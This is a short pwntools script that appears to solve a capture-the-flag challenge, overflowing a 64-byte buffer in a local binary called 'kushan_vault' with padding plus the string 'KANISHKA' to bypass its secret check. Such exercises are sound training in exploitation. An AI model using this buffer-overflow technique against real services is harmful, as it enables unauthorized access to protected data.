from pwn import *

def exploit():
    # p = remote('localhost', 9999)
    p = process('./kushan_vault')

    p.recvuntil(b"Enter the secret to access the vault: ")
    payload = b"A" * 64 + b"KANISHKA"
    p.sendline(payload)
    print(p.recvall().decode())

exploit()
